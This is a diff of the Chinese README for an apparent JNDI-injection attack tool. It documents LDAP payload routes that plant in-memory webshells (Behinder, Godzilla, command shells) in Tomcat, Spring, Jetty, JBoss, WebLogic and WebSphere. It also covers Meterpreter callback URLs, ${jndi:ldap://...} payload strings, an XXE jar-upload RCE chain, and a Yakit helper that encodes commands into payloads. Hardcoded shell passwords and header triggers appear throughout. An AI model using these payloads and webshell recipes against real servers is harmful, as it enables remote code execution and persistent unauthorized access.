@@ -101,39 +101,10 @@ Supported LADP Queries：
     * ```Bypass```: 用于rmi本地工程类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
     * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
     * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
-* 内存马已适配冰蝎4.0,AES加密, 添加后访问```/nu1r```即可, 暂时只写了冰蝎4的shell
-    - 前提条件：Referer: https://nu1r.cn/
-    - 冰蝎4.0使用时，需要先设置key为 ```f90ec6fa47af4bda```
-    - 支持引用类远程加载方式打入（Basic路由）
-    - 支持本地工厂类方式打入 （TomcatBypass路由）
-        * ```SpringInterceptor```: 向系统内植入 Spring Interceptor 类型的内存马
-            * X-nu1r-TOKEN 如果为 ce 则执行命令 , ?X-Token-Data=cmd
-            * X-nu1r-TOKEN 如果为 bx 则为冰蝎马 密码 nu1ryyds
-            * X-nu1r-TOKEN 如果为 gz 则为哥斯拉马 pass nu1r key nu1ryyds
-        * ```WeblogicMemshell1```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
-        * ```WeblogicMemshell2```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```，**推荐**使用此方式
-        * ```JettyFilter```: 利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
-        * ```JettyServlet```: 利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
-        * ```JBossFilter```: 通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
-        * ```JBossServlet```: 通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
-        * ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
-        * ```tomcatFilterJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
-        * ```tomcatFilterTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
-        * ```TomcatListenerJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
-        * ```TomcatListenerTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
-        * ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
-        * ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
-        * ```WSFilter```: `CMD` 命令回显 WebSocket 内存马
-        * ```TomcatExecutor``` : Executor 内存马，通过添加自定义```header``` ```nu1r: d2hvYW1p```
-          的方式传递想要执行的命令，命令要进行Base64编码，需要Tomcat版本8.5+，因为tomcat8.5.0以后，在tomcat封装的socket⽀持unread的数据回写
 * ```WebsphereBypass``` 中的 3 个动作：
     * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
     * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
     * ```rce```：加载已上传至目标服务器临时目录的```jar包```
-      ，从而达到远程代码执行的效果（这一步本地未复现成功，抛```java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.```
-      异常，有复现成功的小伙伴麻烦指导下）
-
-* ```Basic cmd shell``` 的访问方式为 ```/anything?type=basic&pass=[cmd]```
 
 **MSF上线支持**
 
@@ -144,28 +115,38 @@ Supported LADP Queries：
   ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/[msfip]/[msfport]
 ```
 
-# 🐍Yakit一劳永逸的方便法子
+---
 
-先于热加载标签中插入代码
+# 内存马
 
-```go
-jndiNuSer = func(Payload) {
-    Command := str.Split(Payload,"#")
-    cmd := codec.EncodeBase64(Command[1])
-    Payload := str.Replace(Command[0],"CommandNew",cmd,1)
-    return codec.EncodeUrl(Payload)
-}
-```
+两种添加方式：
+- 支持引用类远程加载方式打入（Basic路由）
+- 支持本地工厂类方式打入 （TomcatBypass路由）
+  
+使用说明：
+- 使用冰蝎4.0连接,AES加密, 添加后访问 `/nu1r`
+- 为了区别正常动作与WebShell的区别，添加 `Referer: https://nu1r.cn/` 来使用
+- 密码：`nu1ryyds`
 
-之后只需要改 GadgetType ，与Command即可
-
-```
-{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/Groovy1/Command/Base64/CommandNew}#ping 123)}}
-```
-
-效果图：
-
-![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803131020.png)
+内存马说明：
+* ```SpringInterceptor```: 向系统内植入 Spring Interceptor 类型的内存马
+  * X-nu1r-TOKEN 如果为 ce 则执行命令 , ?X-Token-Data=cmd
+  * X-nu1r-TOKEN 如果为 bx 则为冰蝎马 密码 nu1ryyds
+  * X-nu1r-TOKEN 如果为 gz 则为哥斯拉马 pass nu1r key nu1ryyds
+  * ```JettyFilter```: 利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
+  * ```JettyServlet```: 利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
+  * ```JBossFilter```: 通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
+  * ```JBossServlet```: 通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
+  * ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
+  * ```tomcatFilterJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
+  * ```tomcatFilterTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
+  * ```TomcatListenerJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
+  * ```TomcatListenerTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
+  * ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
+  * ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
+  * ```WSFilter```: `CMD` 命令回显 WebSocket 内存马
+  * ```TomcatExecutor``` : Executor 内存马，通过添加自定义```header``` ```nu1r: d2hvYW1p```
+  的方式传递想要执行的命令，命令要进行Base64编码，需要Tomcat版本8.5+，因为tomcat8.5.0以后，在tomcat封装的socket⽀持unread的数据回写
 
 ---
 
@@ -270,6 +251,8 @@ jndiNuSig = func(Payload) {
 
 ---
 
+# Deserialization路由
+
 | Gadget                                          | 依赖                                                                                                                                                                                                                                                                         |
 |:------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
 | AspectJWeaver                                   | aspectjweaver:1.9.2<br/>commons-collections:3.2.2                                                                                                                                                                                                                          |
@@ -330,6 +313,28 @@ jndiNuSig = func(Payload) {
   ```
   ldap://0.0.0.0:1389/Deserialization/[GadgetType]/Command/Base64/[base64_encoded_cmd]
   ```
+* 使用Yakit方便修改的法子
+
+先于热加载标签中插入代码
+
+```go
+jndiNuSer = func(Payload) {
+    Command := str.Split(Payload,"#")
+    cmd := codec.EncodeBase64(Command[1])
+    Payload := str.Replace(Command[0],"CommandNew",cmd,1)
+    return codec.EncodeUrl(Payload)
+}
+```
+
+之后只需要改 GadgetType ，与Command即可
+
+```
+{{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/Groovy1/Command/Base64/CommandNew}#ping 123)}}
+```
+
+效果图：
+
+![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown微信截图_20220803131020.png)
 
 ---
 
